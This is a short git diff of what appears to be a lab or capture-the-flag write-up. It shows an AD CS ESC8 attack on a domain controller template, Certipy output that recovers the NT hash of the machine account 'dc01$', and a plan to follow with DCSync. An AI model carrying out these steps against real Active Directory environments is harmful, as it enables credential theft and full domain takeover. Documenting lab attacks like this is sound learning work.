@@ -288,7 +288,7 @@ Certificate Templates                   : [!] Could not find any certificate tem
 ```
 It is vulnerable to ESC8
 
-## ESC8 
+## ESC8 leads to domain admin!
 
 I can target the DomainController template since it is enabled and allowed client authentication, and it has enrolkments rights for the domain controller
 
@@ -364,4 +364,8 @@ Certipy v5.0.4 - by Oliver Lyak (ly4k)
 [*] Trying to retrieve NT hash for 'dc01$'
 [*] Got hash for 'dc01$@shadow.gate': aad3b435b51404eeaad3b435b51404ee:57867e655d1abc9f45fd6e954e351531
 ```
-Now i have the NTLM hash for the userm, 
+Now i have the NTLM hash for the user, i can perform a DCSync
+
+```python
+
+```
